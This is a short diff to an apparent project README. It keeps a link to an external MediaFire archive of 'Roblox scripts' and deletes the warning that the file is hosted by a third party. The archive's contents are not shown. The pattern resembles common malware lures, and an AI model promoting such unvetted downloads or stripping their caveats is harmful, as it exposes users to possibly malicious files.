@@ -32,8 +32,6 @@ Additional resources can be downloaded here:
 External archive:
 https://www.mediafire.com/file/vzqpyfncmpwym22/Roblox_scripts_.rar/file
 
-⚠️ Note: This file is hosted on a third-party service. Download and use it at your own discretion.
-
 License
 
 This project is distributed under the MIT License. Usage is permitted within the terms of this license.
